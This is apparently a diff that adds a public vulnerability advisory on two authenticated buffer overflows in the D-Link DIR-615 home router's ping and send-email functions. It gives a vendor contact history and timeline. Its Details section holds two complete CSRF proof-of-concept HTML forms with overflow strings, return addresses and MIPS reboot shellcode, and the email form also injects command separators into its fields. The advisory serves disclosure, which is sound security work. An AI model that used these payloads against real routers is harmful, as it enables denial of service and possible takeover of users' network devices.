@@ -1,0 +1,58 @@
+## Advisory Information
+
+Title: Dlink DIR-615 Authenticated Buffer overflow in Ping and Send email functionality
+Vendors contacted: William Brown <william.brown@dlink.com>, Patrick Cline patrick.cline@dlink.com(Dlink)
+CVE: None
+
+Note: All these security issues have been discussed with the vendor and vendor indicated that they have fixed issues as per the email communication. The vendor had also released the information on their security advisory pages http://securityadvisories.dlink.com/security/publication.aspx?name=SAP10060, 
+http://securityadvisories.dlink.com/security/publication.aspx?name=SAP10061
+
+However, the vendor has taken now the security advisory pages down and hence the information needs to be publicly accessible so that users using these devices can update the router firmwares. The author (Samuel Huntley) releasing this finding is not responsible for anyone using this information for malicious purposes.
+
+## Product Description
+
+DIR-615 -- Wireless N300 router from Dlink. Mainly used by home and small offices.
+
+## Vulnerabilities Summary
+
+I have come across 2 security issues in DIR-615 firmware which allows an attacker using XSRF attack to exploit buffer overflow vulnerabilities in ping and send email functionality.
+
+## Details
+
+# Ping buffer oberflow
+----------------------------------------------------------------------------------------------------------------------
+<!-- reboot shellcode Big Endian MIPS-->
+<html>
+<body>
+<form id="form5" name="form5" enctype="text/plain" method="post" action="http://192.168.100.14/ping_response.cgi">
+<input type="text" id="html_response_page" name="html_response_page" value="tools_vct.asp&html_response_return_page=tools_vct.asp&action=ping_test&ping_ipaddr=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA%2A%BF%99%F4%2A%C1%1C%30AAAA%2A%BF%8F%04CCCC%2A%BC%9B%9CEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEE%2A%BC%BD%90FFFFFFFFFFFFFFFF%3c%06%43%21%34%c6%fe%dc%3c%05%28%12%34%a5%19%69%3c%04%fe%e1%34%84%de%ad%24%02%0f%f8%01%01%01%0c&ping=ping"></td>
+<input type=submit value="submit">
+</form>
+</body>
+</html>
+----------------------------------------------------------------------------------------------------------------------
+
+
+# Send email buffer overflow
+----------------------------------------------------------------------------------------------------------------------
+<!-- reboot shellcode Big Endian MIPS-->
+<html>
+<body>
+<form id="form5" name="form5" enctype="text/plain" method="post" action="http://192.168.100.14/send_log_email.cgi">
+<input type="text" id="auth_active" name="auth_active" value="testy)%3b&log_email_from=test@test.com&auth_acname=sweetBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBIIII%2A%BF%99%F4%2A%C1%1C%30FFFF%2A%BF%8F%04DDDDCCCCBBBB%2A%BC%9B%9CCCC&auth_passwd=test1)&log_email_server=mail.google.com%3breboat%3b%23%23testAAAAAAAAAAAAAAAAAAtestAAAAAAAAAAAAAAAAAAtestAAAAAAAAAAAAAAAAAAtestAAAAAAAAAAAAAAAAAAtestAAAAAAAAAAAAAAAAAAtestAAAAAAAAAAAAAAAAAAtestAAAAAAAAAAAAAAAAAAtestAAAAAAAAAAAAAAAAAAtestAAAAAAAAAAAAAAAAAA&log_email_port=25&log_email_sender=ses@gmail.com%3brebolt%3b%23%23teYYYY%2A%BC%BD%90AAAAAAAAAAAAtest%3c%06%43%21%34%c6%fe%dc%3c%05%28%12%34%a5%19%69%3c%04%fe%e1%34%84%de%ad%24%02%0f%f8%01%01%01%0cAAAAAAAAtestAAAAAAAAAAAAAAAAAAtestAAAAAAAAAAAAAAAAAAtestAAAAAAAAAAAAAAAAAAtestAAAAAAAAAAAAAAAAAAtestAAAAAAAAAAAAAAAAAAtestAAAAAAAAAAAAAAAAAAtestAAAAAAAAAAAAAAAAAAtestAAAAAAAAAAAAAAAAAAtestAAAAAAAAAAAAAAAAAA&model_name=test&action=send_log_email&test=test"></td>
+<input type=submit value="submit">
+</form>
+</body>
+</html>
+----------------------------------------------------------------------------------------------------------------------
+
+
+## Report Timeline
+
+* April 26, 2015: Vulnerability found by Samuel Huntley and reported to William Brown and Patrick Cline.
+* July 17, 2015: Vulnerability was fixed by Dlink as per the email sent by the vendor
+* Nov 13, 2015: A public advisory is sent to security mailing lists.
+
+## Credit
+
+This vulnerability was found by Samuel Huntley
